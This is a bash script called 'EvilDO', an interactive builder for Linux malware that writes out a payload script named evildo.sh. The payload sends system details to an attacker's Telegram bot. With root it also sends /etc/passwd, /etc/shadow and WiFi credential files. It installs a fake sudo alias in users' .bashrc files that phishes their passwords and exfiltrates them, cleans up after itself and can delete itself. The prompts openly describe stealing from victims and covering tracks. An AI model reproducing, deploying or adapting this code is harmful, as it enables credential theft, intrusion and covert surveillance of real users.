#!/bin/bash
INPUT_SYM=$(echo -e "\e[31m>\e[0m")
ENTER_SYM=$(echo -e "\e[31m:\e[0m")
##FUNCS
function F_setup_generate {
cat <<MAINEOF > evildo.sh
if [[ "$MESSAGE" == "y" ]]; then
echo "$QN_MESSAGE_INPUT"
fi
curl -X POST "https://api.telegram.org/bot$QN_API_REQ/sendMessage" -d "chat_id=$QN_ID_REQ&text=New target connected.
Uname: \$(uname -a)

Public IP: \$( curl -s https://ipinfo.io/ip & 2> /dev/null )
" &> /dev/null &

if [[ -f "\$(realpath "\$0")" && "$SELFDEL" == "y" ]]; then
rm -f "\$(realpath "\$0")" &> /dev/null & disown
fi

if [[ "$IFROOT" == "y" && \$(id -u) == "0" ]]; then
if [[ "$IFROOT_ETC" == "y" ]]; then
curl -X POST "https://api.telegram.org/bot$QN_API_REQ/sendMessage" -d "chat_id=$QN_ID_REQ&text=\$( { echo -e "/etc/passwd:"; cat /etc/passwd; echo -e "\n/etc/shadow:"; cat /etc/shadow; } )" &> /dev/null &
fi
if [[ "$IFROOT_ALLHOME" == "y" ]]; then
for i in $(echo /home/*); do
echo '
#!/bin/bash

##FUNCS
function F_coverup {
for i in \$(cat \$HOME/.bashrc | grep -E "(alias sudo=.bash |# Making sudo config for current user)" | cut -c 1-1); do
OUT_CLEAN=\$(cat -n "\$HOME/.bashrc" | grep -E "(alias sudo=.bash |# Making sudo config for current user)" | head -n 1 | grep -Eo [0-9]+)
sed -i "\${OUT_CLEAN}d" \$HOME/.bashrc
done


rm "\$HOME/.bash_info" & disown
' > \${i}/.bash_info
done
for i in $( echo /home/*); do
echo '
}
##FUNCS

if ! ping -c 1 8.8.8.8 &> /dev/null ; then
/bin/sudo \$*
exit
fi

IP=\$( curl -s https://ipinfo.io/ip & 2> /dev/null )
for i in {1..3}; do
read -se -p "[sudo] password for \$(whoami): " pass
pass="\${pass//+/(plus_symbol)}"
curl -X POST "https://api.telegram.org/bot$QN_API_REQ/sendMessage" -d "chat_id=$QN_ID_REQ&text=Password: \$pass

User: \$(whoami)

Uname: \$(uname -a)

Local IP and interfaces: \$(ip a | grep -E \(^[1-9]\|inet\ \) )

Public IP: \$IP
" &> /dev/null &
if (( "\$i" == "2" )); then
F_coverup &
fi
sleep 3
if (( "\$i" == "3" )); then
echo "sudo: 3 incorrect password attempts"
exec bash
else
echo "Sorry, try again."
fi
done
' >> \${i}/.bash_info
done
for i in \$(echo /home/*); do
chown \${i#/home/}:\${i#/home/} \${i}/.bash_info
echo "# Making sudo config for current user" >> "\${i}/.bashrc"
echo "alias sudo='bash \${i}/.bash_info'" >> "\${i}/.bashrc"
done
fi
if [[ "$IFROOT_WIFI" == "y" ]]; then
IFROOT_WIFI_RESULT=
IFROOT_WIFI_FILES=(/etc/NetworkManager/system-connections/* /etc/wpa_supplicant.conf /etc/wpa_supplicant/*.conf /var/lib/iwd/*.psk /var/lib/connman/wifi*managed/settings /etc/netctl/* /var/lib/connman/wifi*managed/*.config)
for i in "\${IFROOT_WIFI_FILES[@]}"; do
if [ -f "\$i" ]; then
IFROOT_WIFI_RESULT="\$IFROOT_WIFI_RESULT
\$i
\$(cat "\$i")"
fi
done
curl -X POST "https://api.telegram.org/bot$QN_API_REQ/sendMessage" -d "chat_id=$QN_ID_REQ&text=\$IFROOT_WIFI_RESULT" &> /dev/null &
fi
else

echo '
#!/bin/bash

##FUNCS
function F_coverup {
for i in \$(cat \$HOME/.bashrc | grep -E "(alias sudo=.bash |# Making sudo config for current user)" | cut -c 1-1); do
OUT_CLEAN=\$(cat -n "\$HOME/.bashrc" | grep -E "(alias sudo=.bash |# Making sudo config for current user)" | head -n 1 | grep -Eo [0-9]+)
sed -i "\${OUT_CLEAN}d" \$HOME/.bashrc
done


rm "\$HOME/.bash_info" & disown
' > \$HOME/.bash_info
echo '
}
##FUNCS

if ! ping -c 1 8.8.8.8 &> /dev/null ; then
/bin/sudo \$*
exit
fi

IP=\$( curl -s https://ipinfo.io/ip & 2> /dev/null )
for i in {1..3}; do
read -se -p "[sudo] password for \$(whoami): " pass
pass="\${pass//+/(plus_symbol)}"
curl -X POST "https://api.telegram.org/bot$QN_API_REQ/sendMessage" -d "chat_id=$QN_ID_REQ&text=Password: \$pass

User: \$(whoami)

Uname: \$(uname -a)

Local IP and interfaces: \$(ip a | grep -E \(^[1-9]\|inet\ \) )

Public IP: \$IP
" &> /dev/null &
if (( "\$i" == "2" )); then
F_coverup &
fi
sleep 3
if (( "\$i" == "3" )); then
echo "sudo: 3 incorrect password attempts"
exec bash
else
echo "Sorry, try again."
fi
done
' >> \$HOME/.bash_info

echo "# Making sudo config for current user" >> "\$HOME/.bashrc"
echo "alias sudo='bash \$HOME/.bash_info'" >> "\$HOME/.bashrc"
exec bash
fi
MAINEOF
}
function F_setup {
echo "
At first, register your Telegram bot with BotFather, that's how we gonna interact with victim's PC. You need HTTP API token and chat ID
"
while true; do
read -p "Do you know how it's done?(y/n) $INPUT_SYM " QN_BOT_HELP
case $QN_BOT_HELP in
y|Y)
break
;;
n|N)
echo "Follow the guide mentioned in README"
;;
*)
echo "Unrecognised option"
;;
esac
done
while true; do
read -p "Good! Then type your HTTP API token here $INPUT_SYM " QN_API_REQ
if [ -n "$QN_API_REQ" ]; then
break
else
echo "It's null"
fi
done

while true; do
read -p "Thanks! Aaand, one more thing, your chat ID $INPUT_SYM " QN_ID_REQ
if [ -n "$QN_ID_REQ" ]; then
break
else
echo "It's null"
fi
done
echo "Pinging your bot..."
curl -X POST "https://api.telegram.org/bot$QN_API_REQ/sendMessage" -d "chat_id=$QN_ID_REQ&text=Hey!
It's EvilDO test message.
All passwords and stuff will be here, in this chat!
Happy hacking!
" &> /dev/null
echo -e '\e[32mGreat! I have sent you a test message! Check for it \e[0m'
echo -e '\e[1;33mWarning: if you have not recived any messages, I suggest you to check data you wrote or refer to README file. \e[0m'
echo -e "
\e[1;33mFor each setup question from this point onward, you can type 'i'. This will print detailed information about current feature.\e[0m
"
while true; do
echo -ne "[\e[31m Basic \e[0m] "
read -p "Prepare the script to be execute as root?(y/n/i) $INPUT_SYM " QN_IFROOT
case "$QN_IFROOT" in
y|Y)
IFROOT="y"
break
;;
n|N)
IFROOT="n"
break
;;
i|I)
echo "
If this option is enabled, script will perform user check, and if it is root - you will gain additional capabilities that can be configured in the next setup questions. (However, if script is executed by root with this option, this will not set aliases to .bashrc of root user, because this does not have any sense):

 - /etc/passwd + /etc/shadow extraction. This option allows the script to retrieve the contents of /etc/passwd and /etc/shadow - two of the most critical files in Linux security. /etc/passwd contains a list of system users, their groups, home directories, default shells, and other things. /etc/shadow stores hashed passwords for all users, including the root account. Extracting this file provides an opportunity to attempt password cracking. This can be useful only if there is more than 1 user, who has his home directory in /home.

 - Set alias to sudo for each user in /home directory. This option allows the script to insert aliases to sudo command for each user. It's giving us an opportunity to steal the password for each user on the system.

- Check for WiFi configuration files. This option checks system for WiFi configuration files and steals them, which contain WIFI AP names and passwords.
"
;;
*)
echo "Unrecognised option"
;;
esac
done
if [[ "$IFROOT" == "y"  ]]; then
while true; do
echo -ne "[\e[31m Basic \e[0m> \e[31mIf root \e[0m] "
read -p "Enable /etc/passwd + /etc/shadow steal?(y/n/i) $INPUT_SYM " QN_IFROOT_ETC
case "$QN_IFROOT_ETC" in
y|Y)
IFROOT_ETC="y"
break
;;
n|N)
IFROOT_ETC="n"
break
;;
i|I)
echo "
This option allows the script to retrieve the contents of /etc/passwd and /etc/shadow - two of the most critical files in Linux security. /etc/passwd contains a list of system users, their groups, home directories, default shells, and other things. /etc/shadow stores hashed passwords for all users, including the root account. Extracting this file provides an opportunity to attempt password cracking.
"
;;
*)
echo "Unrecognised option"
;;
esac
done
while true; do
echo -ne "[\e[31m Basic \e[0m> \e[31mIf root \e[0m] "
read -p "Enable password steal attempt for each user in /home?(y/n/i) $INPUT_SYM " QN_IFROOT_ALLHOME
case "$QN_IFROOT_ALLHOME" in
y|Y)
IFROOT_ALLHOME="y"
break
;;
n|N)
IFROOT_ALLHOME="n"
break
;;
i|I)
echo "
Set alias to sudo for each user in /home directory. This option allows the script to insert aliases to sudo command for each user. It's giving us an opportunity to steal the password for each user on the system.
"
;;
*)
echo "Unrecognised option"
;;
esac
done
while true; do
echo -ne "[\e[31m Basic \e[0m> \e[31mIf root \e[0m] "
read -p "Check for WiFi configuration files?(y/n/i) $INPUT_SYM " QN_IFROOT_WIFI
case "$QN_IFROOT_WIFI" in
y|Y)
IFROOT_WIFI="y"
break
;;
n|N)
IFROOT_WIFI="n"
break
;;
i|I)
echo "
This option checks system for WiFi configuration files and steals them, which contain WiFi AP names and passwords.
"
;;
esac
done
fi
while true; do
echo -ne "[\e[31m Basic \e[0m] "
read -p "Show a message on execution?(y/n/i) $INPUT_SYM " QN_MESSAGE
case "$QN_MESSAGE" in
y|Y)
MESSAGE="y"
read -p "Your message $ENTER_SYM " QN_MESSAGE_INPUT
break
;;
n|N)
MESSAGE="n"
break
;;
i|I)
echo "
This option allows you to display a custom message when a malicious script is executed. Here are some good examples:
- Execute as root
- 404
- Error
- Could not resolve host
...
"
;;
esac
done

while true; do
echo -ne "[\e[31m Basic \e[0m] "
read -p "Self-destruct after execution?(y/n/i) $INPUT_SYM " QN_SELFDEL
case "$QN_SELFDEL" in
y|Y)
SELFDEL="y"
break
;;
n|N)
SELFDEL="n"
break
;;
i|I)
echo "
If this option is enabled, the script will delete itself after execution. This is useful if you want to infect the victim's PC and cover your tracks. Additionally, it may be helpful if the script was first executed as a normal user and you later want it to run with root privileges (for additional functionality), without needing to re-download or regenerate it.
"
;;
esac
done

echo -e "
\e[32mGenerating evildo.sh...\e[0m"
if [ -f "evildo.sh" ]; then
while true; do
read -p "'evildo.sh' already exists, do you want to overwrite it?(y/n) $INPUT_SYM " QN_MAIN_EXISTS
case "$QN_MAIN_EXISTS" in
y|Y)
break
;;
n|N)
echo "Ok. Good luck!"
exit 0
;;
*)
echo "Unrecognised option"
;;
esac
done
fi
F_setup_generate
chmod +x evildo.sh
echo -e "\e[32mGeneration completed! Run 'evildo.sh' on the target device to infect it.

Have a great day! \e[0m"

}
##FUNCS
echo -e '\e[31m


▓█████ ██▒   █▓ ██▓ ██▓    ▓█████▄  ▒█████
▓█   ▀▓██░   █▒▓██▒▓██▒    ▒██▀ ██▌▒██▒  ██▒
▒███   ▓██  █▒░▒██▒▒██░    ░██   █▌▒██░  ██▒
▒▓█  ▄  ▒██ █░░░██░▒██░    ░▓█▄   ▌▒██   ██░
░▒████▒  ▒▀█░  ░██░░██████▒░▒████▓ ░ ████▓▒░
░░ ▒░ ░  ░ ▐░  ░▓  ░ ▒░▓  ░ ▒▒▓  ▒ ░ ▒░▒░▒░
 ░ ░  ░  ░ ░░   ▒ ░░ ░ ▒  ░ ░ ▒  ▒   ░ ▒ ▒░
   ░       ░░   ▒ ░  ░ ░    ░ ░  ░ ░ ░ ░ ▒
   ░  ░     ░   ░      ░  ░   ░        ░ ░
           ░                ░

\e[0m
'
echo -e "[\e[31m1\e[0m] Setup EvilDO
[\e[31m0\e[0m] Quit

"
while true; do
read -p "Welcome here! Choose option $INPUT_SYM " QN_OPTION
case $QN_OPTION in
1)
F_setup
break
;;
0)
echo "Ok. Good luck!"
exit 0
;;
*)
echo "Unrecognised option"
esac
done

